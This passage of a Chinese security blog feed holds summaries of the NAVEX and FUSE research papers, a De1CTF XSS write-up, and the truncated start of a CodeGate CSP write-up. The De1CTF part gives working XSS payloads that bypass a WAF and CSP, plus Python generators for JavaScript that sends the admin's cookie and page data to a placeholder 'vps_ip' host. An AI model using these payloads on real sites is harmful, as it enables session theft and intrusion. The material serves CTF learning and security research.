9行和第10行，此时我们发现第10行是攻击者可控的$_GET变量，那么此时该flow会被输出，并交由运行者进行check，判断其是否为误报。而对于对9行，我们却不太那么容易找到其真实的数据依赖，因为$result实际上来自于数据库内的数据，而非直接显示在代码中。<br>那么此时一般的静态分析工具的缺点便暴露无遗，其会受到数据库查询的约束而不能准确进行分析，且由于其依赖于PDG的后向回溯，很难去发现逻辑上的漏洞。<br>同时还有一个关键的问题，仅从代码上来看，似乎$msg我们可以找到一条攻击路线，但实际上，这是需要前期铺垫的，我们必须拥有session才能到达这一步，这为人工check也增加了不少不便捷性。<br>因此，本篇paper就是旨在解决这些问题，而提出了动静结合的web漏洞挖掘工具：NAVEX</p><h2 id="工具设计"><a href="#工具设计" class="headerlink" title="工具设计"></a>工具设计</h2><p>那么我们来简单看一下，NAVEX是如何设计，用于解决上述问题的。<br>首先作者定义了一个字典：<br><img src="/images/2020-03-25-17-55-55.png" alt=""><br>其中记录一些关键的函数名，例如XSS，对应echo和print等，依次类推，作者一共记录了如下几类攻击的潜在漏洞函数：sql注入、XSS、文件包含、命令注入、代码注入和逻辑漏洞。<br>然后NAVEX一样会像平常的静态分析工具一样，对漏洞进行检测，其也会通过全局定位敏感函数，然后用上述思想，对关键变量进行PDG后向回溯，其伪代码如下：<br><img src="/images/2020-03-25-09-37-30.png" alt=""><br>运行结束后，程序会返回路径集，即从攻击者可控变量source($_GET、$_POST等)到潜在漏洞函数调用之间的变量传递。<br>值得一提的是，作者这里不仅仅使用了PDG的后向分析，同时其为了发掘逻辑上的漏洞，也会进行正向寻找。<br>然后作者会将提取出的约束放入Z3求解器进行约束求解。以备后续生成exp使用。<br>待上述操作结束后，程序进入动态分析，或者称为前端约束生成阶段。在这一步中，作者使用爬虫，爬取html页面中的信息和属性名，例如提取form表单或者js的相关约束：<br><img src="/images/2020-03-25-10-00-34.png" alt=""><br>然后同样会使用约束器求解，得到满足的input，并进行输入，但由于可能input也会受到后端的约束，因此为了防止爬虫由于未能正确input，不能到达下一步，作者对后端进行了监控，以探测在input后，后端是否会发生变化，例如进行数据库查询，或者改变了当前状态，例如全局变量的赋值(session，cookie等)，或者新产生了变量等。以此断定爬虫的前段约束后得到的input是否生效，如果未生效，其会同时考虑后端约束，并再次求解，而后继续监控往复，直到成功input。<br>如我们最开始的例子中，此时会考虑到后端的约束，即$publisher的长度问题：<br><img src="/images/2020-03-25-10-08-45.png" alt=""><br>同时作者也考虑过了角色问题，在web网站中，通常会分为管理员和普通用户，那么为了最大的代码覆盖率，作者会存储管理员用户的登录凭证，以方便探测到管理员用户可能存在的潜在漏洞。<br>为了存储这些关系，作者定义了Navigation Graph，其为有向图：G = (N , E )，它的边代表了下一步跳转的意义，例如下图：<br><img src="/images/2020-03-25-18-15-32.png" alt=""><br>在我们第一步达到selectBooks.php后，在html模拟用户input，会来到下一个url操作：selectBooks.php?action=borrow，而这2个node之间则会产生一条edge，又前者指向后者。<br>同时对于每一个Node，其拥有一些属性，例如id为每一个node的唯一标识符，url为当前node的链接，form_params为表单的input，role存放管理员用户的登录凭证。<br>如此一来，在找到漏洞点后，作者即可找到一条可到达，并触发该漏洞函数的链接，如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1. http://localhost/App/index.php</span><br><span class="line">2. http://localhost/App/selectBooks.php with POST params:[book name=intro to CS by author1, edition=2,publisher=aaaaaaa]</span><br><span class="line">3. http://localhost/App/selectBooks.php?action =borrow</span><br><span class="line">4. http://localhost/App/hold.php</span><br><span class="line">5. http://localhost/App/hold.php?step=checkout</span><br><span class="line">6. http://localhost/App/hold.php?step=checkout &amp;msg=&lt;script&gt;alert(”XSS”);&lt;/script&gt;</span><br></pre></td></tr></table></figure></p><p>最终成功将exp带入到6条语句，成功进行xss攻击。</p><h2 id="实验测试"><a href="#实验测试" class="headerlink" title="实验测试"></a>实验测试</h2><p>作者对26个php cms进行了测试，php文件数量超过22.7k，列表如下：<br><img src="/images/2020-03-25-18-21-01.png" alt=""><br>对于sql注入，作者只关心了如下4种潜在的漏洞函数：mssql query, mysql query, mysqli query和sqlite query，并通过实验测试发现，在不到1小时的时间内，工具生成了105个sql注入exp：<br><img src="/images/2020-03-25-18-24-27.png" alt=""><br>可以看到在获得的结果里，均为true positives，以此显现了 NAVEX的高精度和高效率。<br>同样的，对于XSS和逻辑漏洞，在较短的时间内，都有不错的表现：<br><img src="/images/2020-03-25-18-25-24.png" alt=""><br><img src="/images/2020-03-25-18-25-38.png" alt=""></p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>本篇文章的思路较为新颖，由于其动静态结合的方式，不仅可以一定程度上增加效率，并且能够有效的探测到一些普通静态分析工具不能检测出的漏洞。其贡献不仅在于学术上的创新，对我们cms审计也提供了不少的便利。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;这次介绍的是一篇发表在安全顶会2018 USENIX Security的paper，文章旨在自动化挖掘web漏洞，同时生成对应的exp，其比
      
    
    </summary>
    
      <category term="paper" scheme="http://skysec.top/categories/paper/"/>
    
    
      <category term="web" scheme="http://skysec.top/tags/web/"/>
    
      <category term="paper" scheme="http://skysec.top/tags/paper/"/>
    
  </entry>
  
  <entry>
    <title>2020 De1CTF &amp; Animal Crossing</title>
    <link href="http://skysec.top/2020/05/03/2020%20De1CTF%20&amp;%20Animal%20Crossing/"/>
    <id>http://skysec.top/2020/05/03/2020 De1CTF &amp; Animal Crossing/</id>
    <published>2020-05-03T02:23:34.000Z</published>
    <updated>2020-06-22T07:26:32.312Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>五一的时候参与了一下De1CTF，里面有一道题让我印象很深刻：Animal Crossing。</p><h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>题干描述如下：<br><img src="/images/2020-05-06-20-18-20.png" alt=""><br>可能作者很喜欢玩动森），进去之后是一个如下页面：<br><img src="/images/2020-05-06-20-18-42.png" alt=""><br>我们随机输入一些字符串后，来到下一页：<br><img src="/images/2020-05-06-20-19-10.png" alt=""><br>此时我们的url：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://134.175.231.113:8848/passport?image=%2Fstatic%2Fhead.jpg&amp;island=vwev&amp;fruit=&amp;name=ewvc&amp;data=vcwevcw</span><br></pre></td></tr></table></figure></p><p>我们随机更改，页面会相应变化，同时发现有admin report界面：<br><img src="/images/2020-05-06-20-19-41.png" alt=""><br>那么很明显了，这应该是一个xss打管理员cookie的题目。<br>尝试fuzz了一下各个参数，发现攻击点应该在data参数上，但其过滤了大量的字符，并且设有csp,导致常规的xss做法并不适用：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: default-src &apos;self&apos; &apos;unsafe-inline&apos; &apos;unsafe-eval&apos;;object-src &apos;none&apos;;</span><br></pre></td></tr></table></figure></p><p><img src="/images/2020-05-06-20-20-45.png" alt=""></p><h2 id="原型链构造"><a href="#原型链构造" class="headerlink" title="原型链构造"></a>原型链构造</h2><p><img src="/images/2020-05-06-20-21-26.png" alt=""><br>发现我们的代码会被拼接在此处进行执行，那么首先进行闭合：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view-source:http://134.175.231.113:8848/passport?image=%2Fstatic%2Fhead.jpg&amp;island=vwev&amp;fruit=&amp;name=ewvc&amp;data=%27||1111//</span><br></pre></td></tr></table></figure></p><p><img src="/images/2020-05-06-20-22-16.png" alt=""><br>那么如何利用1111部分的代码，让我们达到执行任意代码的目的呢？<br>这里就和一些trick有关，我们看一个例子：<br><img src="/images/2020-05-06-20-25-44.png" alt=""><br>可以看到，对于toString，其会将其他值以字符串形式表示，特别的，对于对象，其会转换为[object Object]，而对于数组，其会转换为Array.join(‘,’)的形式进行拼接。但是对于valueOf( )，其返回的则是自身。<br>那我们再看一个例子：<br><img src="/images/2020-05-06-20-31-27.png" alt=""><br>在一元加操作符操作对象的时候，会先调用对象的valueOf方法来转换，如此一来，我们可以利用这一特点，进行函数构造执行代码。那么我们回到题目中：<br><img src="/images/2020-05-06-20-34-39.png" alt=""><br>如此一来，我们就可以定义function内容：<br><img src="/images/2020-05-06-20-35-06.png" alt=""><br>那么我们再搭配上valueOf：<br><img src="/images/2020-05-06-20-36-55.png" alt=""><br>当然，代码中没有+1的操作，那么怎么触发valueOf呢？其实很简单：<br><img src="/images/2020-05-06-20-40-04.png" alt=""><br>如此一来，我们即可进行任意代码执行。</p><h2 id="xss打cookie"><a href="#xss打cookie" class="headerlink" title="xss打cookie"></a>xss打cookie</h2><p>在可执行任意代码后，我们下一步就是进行location跳转打cookie:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">location=<span class="string">'http://vps_ip?flag='</span>+<span class="built_in">document</span>.cookie</span><br></pre></td></tr></table></figure></p><p>但是由于题目设置了较为恶心的waf，所以我们这里选择利用atob编码绕过：<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode</span><br><span class="line"></span><br><span class="line">s = <span class="string">"""</span></span><br><span class="line"><span class="string">location='http://vps_ip?flag='+document.cookie</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line">print(s)</span><br><span class="line"></span><br><span class="line">data=b64encode(s.encode(<span class="string">'utf-8'</span>)).decode(<span class="string">'utf-8'</span>).replace(<span class="string">'+'</span>, <span class="string">'%2b'</span>).replace(<span class="string">'='</span>,<span class="string">'%3d'</span>)</span><br><span class="line"></span><br><span class="line">url = <span class="string">"/passport?image=&amp;island=&amp;fruit=&amp;name=&amp;data=%27||&#123;%22valueOf%22:new%20%22%22.constructor.constructor(atob(%27"</span>+ data +<span class="string">"%27))&#125;%2b1//"</span></span><br><span class="line">print(url)</span><br></pre></td></tr></table></figure></p><p>编写代码如上，以用于自动生成exp。<br>攻击后即可得到管理员cookie:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FLAG=De1CTF&#123;I_l1k4_</span><br></pre></td></tr></table></figure></p><h2 id="xss打管理员页面"><a href="#xss打管理员页面" class="headerlink" title="xss打管理员页面"></a>xss打管理员页面</h2><p>但很显然只有一半flag是不行的，于是想到读一下管理员页面信息：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">location=&apos;http://vps_ip?flag=&apos;+btoa(document.body.innerHTML)</span><br></pre></td></tr></table></figure></p><p>得到信息解码后如下：<br><img src="/images/2020-05-06-20-45-08.png" alt=""><br>可以发现管理员界面有无数张图片= =，猜想flag要么是其中一张，要么是拼接所有图片得到。那么尝试访问目录访问图片，但发现均为500，无法直接访问。<br>于是这里想到方案有2种：<br>1.利用js截图，将页面带出<br>2.将图片全部传出来<br>在解题中我选择了第二种思路，那么如何把图片传出呢？这里我们发现题目还有一个上传功能，可以让我们上传头像，但是只允许png和jpg后缀，这也是为何我选择了第二种方法，因为后缀名没法bypass（但是后来交流发现，不需要bypass后缀= =，我太菜啦！）<br>那么这里的思路转变为让管理员将图片上传后，再将return的访问url传出到我们的vps，我们即可获取到图片，于是写出如下脚本：<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode</span><br><span class="line"></span><br><span class="line">s = <span class="string">"""</span></span><br><span class="line"><span class="string">(async()=&gt;&#123;</span></span><br><span class="line"><span class="string">    const arr = []</span></span><br><span class="line"><span class="string">    for(let i=1;i&lt;=9;i++) &#123;</span></span><br><span class="line"><span class="string">        res = await fetch(`/island/test_$0&#123;i&#125;.png`)</span></span><br><span class="line"><span class="string">        data = await res.blob()</span></span><br><span class="line"><span class="string">        const os = new FormData();</span></span><br><span class="line"><span class="string">        const mf = new File([data], "name.png");</span></span><br><span class="line"><span class="string">        os.append("file", mf);</span></span><br><span class="line"><span class="string">        r = await fetch("/upload", &#123;method: "POST",body: os&#125;)</span></span><br><span class="line"><span class="string">        data = await r.json()</span></span><br><span class="line"><span class="string">        arr.push(data.data)</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    location="http://vps_ip/?c="+btoa(JSON.stringify(arr))</span></span><br><span class="line"><span class="string">&#125;)();</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line">print(s)</span><br><span class="line"></span><br><span class="line">data=b64encode(s.encode(<span class="string">'utf-8'</span>)).decode(<span class="string">'utf-8'</span>).replace(<span class="string">'+'</span>, <span class="string">'%2b'</span>).replace(<span class="string">'='</span>,<span class="string">'%3d'</span>)</span><br><span class="line"></span><br><span class="line">url = <span class="string">"/passport?image=&amp;island=&amp;fruit=&amp;name=&amp;data=%27||&#123;%22valueOf%22:new%20%22%22.constructor.constructor(atob(%27"</span>+ data +<span class="string">"%27))&#125;%2b1//"</span></span><br><span class="line">print(url)</span><br></pre></td></tr></table></figure></p><p>然后将400张图拼在一起，得到后半段flag：<br><img src="/images/2020-05-06-20-51-24.png" alt=""><br>当然这里额外提一下，其实引入js库，不需要bypass js后缀，我们利用如下方式即可：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fetch(`/static/images/xxxxxx.png`).then(res=&gt;res.text()).then(txt=&gt;eval(txt))</span><br></pre></td></tr></table></figure></p><p>然后引入js库，截图后将图片利用upload上传，再把return url发送到我们服务器即可~</p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>这道xss是我认为De1CTF比较有趣的一道题目了，首先考的就是纯web，其次出题的思路比较好，而不是一味的恶心人= =，点个赞~</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;五一的时候参与了一下De1CTF，里面有一道题让我印象很深刻：Animal Crossing。&lt;/p&gt;
&lt;h2 id=&quot;题目分析&quot;&gt;&lt;a h
      
    
    </summary>
    
      <category term="web" scheme="http://skysec.top/categories/web/"/>
    
    
      <category term="web" scheme="http://skysec.top/tags/web/"/>
    
      <category term="writeup" scheme="http://skysec.top/tags/writeup/"/>
    
  </entry>
  
  <entry>
    <title>Paper Summary &amp; FUSE &amp; Finding File Upload Bugs via Penetration Testing</title>
    <link href="http://skysec.top/2020/04/29/Paper%20Summary%20&amp;%20FUSE%20&amp;%20Finding%20File%20Upload%20Bugs%20via%20Penetration%20Testing/"/>
    <id>http://skysec.top/2020/04/29/Paper Summary &amp; FUSE &amp; Finding File Upload Bugs via Penetration Testing/</id>
    <published>2020-04-29T02:23:34.000Z</published>
    <updated>2020-06-22T07:26:17.319Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这次介绍的是一篇发表在安全顶会NDSS 2020上的一篇paper，其针对文件上传漏洞的场景，实现了一款动态fuzz的工具FUSE，并利用其发现了现有33个CMS的15 CVE。</p><h2 id="背景介绍"><a href="#背景介绍" class="headerlink" title="背景介绍"></a>背景介绍</h2><p>首先提几个关键的缩写含义，对于漏洞分类上，可以大致为两类，即：<br>UFU：为Unrestricted File Upload的缩写，含义即任意文件上传。<br>UEFU：为Unrestricted Executable File Upload的缩写，含义即任意可执行文件上传。<br>但这两类可能有一个子集的包含关系，UEFU应该为UFU的子集，因为我们上传的文件未必是可执行的。<br>然后是对于上传的恶意文件，我们也可以分为两类：<br>CE：为code execution的缩写，含义即为代码执行。<br>PCE：为potential code execution的缩写，含义即为潜在的任意代码执行。<br>一类就是代码执行的文件，这个非常容易理解，比如我们常见的一句话木马，而潜在代码执行的文件，可以理解成js等，需要引入或者满足一定条件的触发才会让其产生威胁。<br>而至于文件上传漏洞，作为一种危害性大，案例多的web漏洞，应该大家都比较熟悉了。那么其出现漏洞的位置也是多样化的，例如后缀名过滤产生的问题：<br><img src="/images/2020-03-27-10-07-36.png" alt=""><br>我们可以看到黑名单过滤产生了2个弊端：第一是黑名单中的后缀名可能会有遗漏，第二是此处黑名单匹配并未使用大小写通配，从而会导致大小写Bypass。<br>同样的，漏洞也可能会是Content-Type过滤产生的问题：<br><img src="/images/2020-03-27-10-08-11.png" alt=""><br>例如上述代码中，我们看到其会对Content-Type进行过滤，而Content-Type并不能真实反映文件的内容，是可通过burp等抓包工具进行拦截修改的，所以同样会产生安全隐患。<br>那么对于文件上传出现漏洞的多样性，其实对攻击者的探测产生了一些麻烦，我们在黑盒的情况下或者在找到上传点的情况下，可能需要通过大量的猜测和探测才能找到正确的Bypass模式，但实际上很多时候这是一种低效率的行为，有没有可能有一款类似sqlmap的工具，来自动化的fuzz上传接口呢？于是便有了FUSE这款工具。</p><h2 id="工具设计"><a href="#工具设计" class="headerlink" title="工具设计"></a>工具设计</h2><p>我们首先看一下工具的架构：<br><img src="/images/2020-03-27-10-10-26.png" alt=""><br>那么实际上该工具的重点就在于其如何产生有效的payload和验证payload的攻击是否生效，首先我们先看其如何有效的产生payload：<br><img src="/images/2020-03-27-10-18-13.png" alt=""><br>我们注意到，在一次文件上传的请求里，其实有很多位置是我们可以进行伪造更改的，因此作者将常见的文件上传bypass技巧归纳为如下多种模式：<br><img src="/images/2020-03-27-10-16-35.png" alt=""><br>比如M3更改content-type，M4更改文件名后缀等等，当然我们肯定存在后端检测文件上传时，既检测content-type，又检测文件名后缀的情况，因此作者会对其进行排列组合进行测试：<br><img src="/images/2020-03-27-12-22-53.png" alt=""><br>测试的时候，假如我们选定的seed模式为M1、M2、M3，那么工具会生成如上排列组合的模式，依次进行探测，从第一不修改任何参数进行恶意文件上传，到按照M1M2M3模式修改所有参数进行上传，当然如果其中某一种上传成功，那么自然不会去尝试包含这一种修改的修改，例如：<br><img src="/images/2020-03-27-12-25-50.png" alt=""><br>当M1测试后，如果M1测试成功，我们的恶意文件已上传，那么则不会去尝试M1M3的组合，因为没有意义，其应该一定为成功。<br>当然这里可能涉及到相互冲突的问题，假设M1M3一起修改，可能会有冲突，所以考虑到这样的问题，工具也会进行筛选操作，例如M1和M2一起会产生冲突，那么M1M2和M1M2M3这两种排列组合不会进行组合修改。<br><img src="/images/2020-03-27-12-24-29.png" alt=""><br>了解了payload的生成方式，我们再来看一下如何获取恶意文件上传后的路径，以用于检测是否攻击成功：<br><img src="/images/2020-03-27-10-16-00.png" alt=""><br>工具有相应的config文件，其可以指定上传成功后的路径前缀，或者response里的路径url，以此正则去提取上传后的文件路径。当然作为一种修复文件上传漏洞的方案，常看见到文件名更改和路径的隐藏，上传者无法知道文件传到了何处，其文件名是什么。那么对于这一种情况，作者使用了一个文件监视器：<br><img src="/images/2020-03-27-12-30-26.png" alt=""><br>该监视器运行在攻击目标服务器上，时刻监视该服务器上的文件创建。也是因为这一点，我个人认为FUSE可能更像一款动态fuzz的漏洞发掘工具，而非一款典型的渗透测试工具，因为这一需求我们在渗透测试中是肯定不会满足的，如果都有目标服务器的控制权限了，那么也没必要进行攻击了。所以这款工具的目标，更像去挖掘一些开源现有cms的文件上传漏洞。<br>然后是工具的运行逻辑：<br><img src="/images/2020-03-27-10-16-13.png" alt=""><br>这就比较清晰了，即排列组合上述的payload，然后进行不断的上传测试，通过访问上传后的路径，判断文件是否上传成功。</p><h2 id="实验结果"><a href="#实验结果" class="headerlink" title="实验结果"></a>实验结果</h2><p>工具的作者关注点在于4种文件：php、html、xhtml、js，故此根据这4种文件，作者进行上传，以测试其是否允许CE或者PCE文件的上传。<br>首先数据集上，作者选取了33个CMS，并找到其中的文件上传点，然后利用工具进行动态fuzz，得到如下结果：<br><img src="/images/2020-03-27-10-16-57.png" alt=""><br>我们从结果里可以看到，其中有9个cms是需要文件监视器的，即上传后的文件路径和文件名难以被攻击者直接获取。同时我们发现PCE中只有php和js，这可能是因为php文件虽然上传成功，但未必能被直接解析，其可能受到.htaccess的影响，而导致其只能是潜在的代码执行文件，可能需要配合任意文件删除漏洞，才能发挥作用。而对于js，其一般是需要被html等调用触发，才能造成一系列的攻击，故其也作为了一种PCE文件。<br>当然除此之外，该工具有测试尝试上传了.htaccess文件，我们知道.htaccess是可以更改apache子目录配置的，其可以指定将jpg后缀按照php进行解析等，很容易导致组合拳形式的bypass，所以对其的测试是很有必要的，我们也可以看到在上述CMS中，有6个CMS是允许.htaccess上传的，这是相当危险的。</p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>FUSE这款工具我个人认为，其定义应该为文件上传界的sqlmap，但由于其较强的约束条件，可能在实战黑盒测试中作用有限，应对会修改文件名和文件路径，或做隐藏的安全保护，是比较难以突破的。<br>工具开源在：<a href="https://github.com/WSP-LAB/FUSE" target="_blank" rel="noopener">https://github.com/WSP-LAB/FUSE</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;这次介绍的是一篇发表在安全顶会NDSS 2020上的一篇paper，其针对文件上传漏洞的场景，实现了一款动态fuzz的工具FUSE，并利用其
      
    
    </summary>
    
      <category term="paper" scheme="http://skysec.top/categories/paper/"/>
    
    
      <category term="web" scheme="http://skysec.top/tags/web/"/>
    
      <category term="paper" scheme="http://skysec.top/tags/paper/"/>
    
  </entry>
  
  <entry>
    <title>2020 CodeGate Web Writeup</title>
    <link href="http://skysec.top/2020/02/09/2020%20CodeGate%20Web%20Writeup/"/>
    <id>http://skysec.top/2020/02/09/2020 CodeGate Web Writeup/</id>
    <published>2020-02-09T02:23:34.000Z</published>
    <updated>2020-06-22T07:26:41.300Z</updated>
    
    <content type="html"><![CDATA[<h2 id="CSP"><a href="#CSP" class="headerlink" title="CSP"></a>CSP</h2><p>随手尝试：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">110.10.147.166/view.php?name=123&amp;p1=456&amp;p2=789</span><br></pre></td></tr></table></figure></p><p>得到如下url:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/api.php?sig=43bb08065a4d2217ca3881e93c65276b&amp;q=TVRJeixORFUyLE56ZzU=</span><br></pre></td></tr></table></figure></p><p>不难发现，view.php的功能，是帮助我们把name、p1、p2转化格式后，发送给api.php。<br>其中q的值为：<br><img src="/images/2020-02-09-15-44-51.png" alt=""><br>同时存在一个report功能：<br><img src="/images/2020-02-09-15-47-06.png" alt=""><br>如果把api.php的payload传过去，就能触发XSS，但是考虑到题目有CSP：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: default-src &apos;self&apos;; script-src &apos;none&apos;; base-uri &apos;none&apos;;</span><br></pre></td></tr></table></figure></p><p>显然需要bypass CSP，此时我们关注到api.php的代码实现：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">$apis = explode(<span class="string">"|"</span>, $api_string);</span><br><span class="line"><span class="keyword">foreach</span>($apis <span class="keyword">as</span> $s) &#123;</span><br><span class="line">    $info = explode(<span class="string">","</span>, $s);</span><br><span class="line">    <span class="keyword">if</span>(count($info) != <span class="number">3</span>)</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    $n = base64_decode($info[<span class="number">0</span>]);</span><br><span class="line">    $p1 = base64_decode($info[<span class="number">1</span>]);</span><br><span class="line">    $p2 = base64_decode($info[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($n === <span class="string">"header"</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(strlen($p1) &gt; <span class="number">10</span>)</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">if</span>(strpos($p1.$p2, <span class="string">":"</span>) !== <span class="keyword">false</span> || strpos($p1.$p2, <span class="string">"-"</span>) !== <span class="keyword">false</span>) <span class="comment">//Don't trick...</span></span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        header(<span class="string">"$p1: $p2"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">elseif</span> ($n === <span class="string">"cookie"</span>) &#123;</span><br><span class="line">        setcookie($p1, $p2);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">elseif</span> ($n === <span class="string">"body"</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">"/&lt;.*&gt;/"</span>, $p1))</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">echo</span> $p1;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"\n&lt;br /&gt;\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">elseif</span> ($n === <span class="string">"hello"</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Hello, World!\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>我们可以利用header进行bypass csp，但是需要同时对body传入exp,而view.php只能处理单个元组，不能同时为我们签名header和body：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">header,p1(b64),p2(b64)|body,p1(b64),p2(b64) ...</span><br></pre></td></tr></table></figure></p><p>所以我们需要自己根据算法构造sig，考虑到api.php的检测方式：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">"q"</span>]) || !<span class="keyword">isset</span>($_GET[<span class="string">"sig"</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"?"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$api_string = base64_decode($_GET[<span class="string">"q"</span>]);</span><br><span class="line">$sig = $_GET[<span class="string">"sig"</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(md5($salt.$api_string) !== $sig)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"??"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>发现我们可以尝试hash长度拓展攻击，首先我们已有一个元组和签名：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">name=123,p1=456,p2=789</span><br><span class="line">sig=43bb08065a4d2217ca3881e93c65276b</span><br></pre></td></tr></table></figure></p><p>但是我们未知salt的长度，那么需要进行爆破：<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span 